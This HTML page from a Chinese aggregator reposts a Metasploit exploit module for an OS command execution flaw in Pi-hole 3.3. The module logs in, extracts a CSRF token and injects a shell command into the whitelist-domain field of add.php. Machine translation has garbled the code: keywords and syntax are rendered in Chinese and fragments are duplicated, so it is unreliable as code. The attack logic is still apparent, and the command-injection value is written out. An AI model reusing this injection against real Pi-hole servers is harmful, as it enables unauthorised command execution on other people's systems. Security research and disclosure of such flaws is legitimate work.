<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>PI-Hole 3.3命令执行</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">PI-Hole 3.3命令执行</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-05-29 00:39:05</div><div class="page_narrow text-break page_content"><p>#此模块需要Metasploit：https://metasploit.com/download#当前源：https://github.com/rapid7/metasploit-framework##class MetasploitModule&lt；msf：：Explit：：Remote Rank=卓越排名包括msf：：Explit：：Remote：：HttpClient include msf：：Explore：：CmdStager def Initialize(INFO={})SUPER(UPDATE_INFO(INFO，&#39；NAME&#39；=&gt；=&39；PI-Hole White elist OS命令执行。说明&#39；=&gt；%q{这利用了PI-Hole&lt；=3.3中的命令执行漏洞。将新域添加到白名单时，可以将命令链接到操作系统上运行的域。}，&#39；=&&gt;msf_license，&#39；作者&#39；=&&gt;[&#39；h00die&39；，#msf模块&#39；Denis Andzakovic&#39；#Original PoC，Discovery]，&#39；参考&#39；=&&gt;；[[&#39；url&#39；，&#39；https://pulsesecurity.co.nz/advisories/pihole-v3.3-vulns&#39；]]，&#39；Platform&#39；=&&gt;；[&#39；=&&gt;；[&#39；=&&gt;；Linux&#39；]，&#39；特权&#39；=&gt；false，&#39；Arch&#39；=&gt；[ARCH_X86，ARCH_X64，ARCH_CMD]，&#39；目标&#39；=&&gt;；[[&#39；自动目标&#39；，{}]]，&#39；DisclosureDate。2018年4月15日，#39；，&39；DefaultTarget&#39；=&gt；0，&#39；备注&#39；=&gt；{&#39；稳定性&#39；=&gt；[CRASH_SAFE]，&#39；副作用&#39；=&gt；[工件_on_disk]，&#39；可靠性&#39；=&gt；[REPEATABLE_SESSION]}))REGISTER_OPTIONS([opt：：rport(80)，OptString.new(&#39；TARGETURI&#39；，[true，&#39；PI-Hole网站的URI&#39；，&#39；/&#39；])，OptString.new(&#39；Password&39；，[false，&#39；Password for PI-Hole interface&#39；，&#39；])，])end def login(Cookie)vprint_status(&#39；需要登录，正在尝试登录。&#39；)send_request_cgi(&#39；uri&#39；=&gt；Normize_uri(target_uri.path；admin&39；，&#39；settings.php&39；)，&#39；cookie&#39；=&gt；cookie，&#39；vars_get。tab&#39；=&&gt;；阻止列表&#39；}，&#39；vars_post&#39；=&&gt;；{&#39；pw&#39；=&&gt;；数据存储[&#39；密码&#39；]}，&#39；方法&#39；=&&gt;39；&#39；)end def EXECUTE_COMMAND(cmd，_opts={})#get cookie res=send。URI&#39；=&gt；Normalize_uri(target_uri.path；admin&#39；，&#39；index.php&#39；))cookie=res.get_cookies print_status(&#34；using cookie：#{cookie}&34；)#get Token res=send_request_cgi(&#39；uri&#39；=&&gt;；Normalize_uri(target_uri.path，&#34；)#get Token res=send_request_cgi(&#39；uri&#39；=&&gt;；Normize_uri(target_uri.path，&。list.php&#39；)，&#39；cookie&#39；=&gt；cookie，&#39；vars_get&#39；=&gt；{&#39；l&#39；=&gt；&#39；白色&#39；})#如果res&amp；&amp；res.body.include？(&#39；登录以开始您的会话&#39；)res=login(Cookie)结束，我们是否收到登录提示。res.body.include？(&#39；登录以启动您的会话&#39；)FAIL_WITH(失败：：错误配置，&#39；密码不正确)结束#&lt；div id=&#34；Token&#34；hidden&gt；f5al5pNfFj9YOCSdX159tXjttdHUOAuxOJDgwcgnUHs=&lt；/div&gt；#还可能包括/%r{div id=&#34；Token&#34；hidden&gt；(？&lt；token&gt；[\w+=/]+)&lt；/div&gt；}=~res.body除非令牌FAIL_WITH(FAILURE：：UnexpectedReply，&#39；无法找到令牌&#39；)End Print_Status(&#34；使用令牌：#{Token}&#34；)SEND_REQUEST_CGI({&#39；method&#39；=&&gt;；&#39；POST&#39；，&#39；CTYPE&#39；=&gt；=&#39；application/x-www-form-urlencode。=&&gt;cookie，&#39；uri&#39；=&gt；Normize_uri(target_uri.path，&#39；admin&39；，&#39；script&#39；，&#39；pi-hole&#39；，&#39；php&#39；，&#39；add.php&#39；)，&#39；vars_post&#39；=&gt；{&#39；domain&#39。#{rand_text_alphanumeric(3..5)}.com；#{cmd}&#34；，&#39；List&#39；=&&gt;；白色&#39；，&#39；Token&#39；=&gt；Token}})结束定义检查BEGIN RES=SEND_REQUEST_cgi(&#39；uri&#39；=&&gt;；Normize_uri(target_uri.path，&#39；admin&#39；，&#39；index.php&#39；index.php&#39；)，&#39；方法&#39；=&&gt;；获取&#39；)FAIL_WITH(FAILURE：：UnexpectedReply，&#34；#{Peer}-无法连接到Web服务-没有响应&#34；)如果res.nil？FAIL_WITH(FAILURE：：UnexpectedReply，&#34；#{Peer}-检查URI路径，意外的HTTP响应代码：#{res.code}&#34；)if res.code！=200#vDev(head，v3.2.1-0-g31dd8-脏)#v3.2.1%r{&lt；b&gt；Web界面版本\s*&lt；/b&gt；\s*(vDev\(head，)？v？[\d\.]+)\)？.*&lt；b&gt；}m=~res.body if version&amp；&amp；Gem：：Version.new(Version)&lt；Gem：：Version.new(&#39；3.3&#39；)vprint_Good(&#34；检测到的版本：#{Version}&#34；)return CheckCode：：显示其他vprint_BAD(&#34；检测到的版本：#{Version}&#34。)返回CheckCode：：Safe End救援：：Rex：：ConnectionError FAIL_WITH(Failure：：Unreacable，&#34；#{Peer}-无法连接到Web服务&#34；)End CheckCode：：Safe End Def Exit If CheckCode：：Fail_With(Failure：：NotVulnerable，&#39；Target is not Vulnerable&#39；)END BEGIN EXECUTE_cmdstager(风味：：Bourne。#{Peer}-无法连接到Web服务&#34；)结束端结束</p></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://packetstormsecurity.com/files/157831/Pi-Hole-3.3-Command-Execution.html">https://packetstormsecurity.com/files/157831/Pi-Hole-3.3-Command-Execution.html</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/pi/">#pi</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/登录/">#登录</a></button></div></div><div class="shadow p-3 mb-5 bg-white rounded clearfix"><div class="container"><div class="row"><div class="col-sm"><div><a target="_blank" href="/story/1004068.html"><img src="http://img.diglog.com/img/2020/5/thumb_011fa8cf9ca03969ec3040db302c8292.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1004068.html">Raspberry PI 4获得8 GB内存，Raspbian 64位(Beta)</a></div><span class="my_story_list_date">2020-5-28 20:10</span></div><div class="col-sm"><div><a target="_blank" href="/story/1003600.html"><img src="http://img.diglog.com/img/2020/5/thumb_28a5bd80163fe23ff5fb7b7874be25ed.png" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1003600.html">黄金比例能准确地用e和π表示吗？</a></div><span class="my_story_list_date">2020-5-25 13:12</span></div><div class="col-sm"><div><a target="_blank" href="/story/1002748.html"><img src="http://img.diglog.com/img/2020/5/thumb_08566fd51093290a6e986f49409db634.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1002748.html">Raspberry PI操作系统看起来像OS X</a></div><span class="my_story_list_date">2020-5-19 15:10</span></div><div class="col-sm"><div><a target="_blank" href="/story/1000143.html"><img src="http://img.diglog.com/img/2020/5/thumb_b63445106b3eb7a38d5d84d1d3ed0c6b.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1000143.html">覆盆子Pi宣布售价50美元，配备可更换镜头的1200万像素相机</a></div><span class="my_story_list_date">2020-5-2 17:53</span></div></div></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/病毒/">#病毒</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/冠状病毒/">#冠状病毒</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/app/">#app</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/linux/">#linux</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy; 2020 diglog.com </div></div></body></html>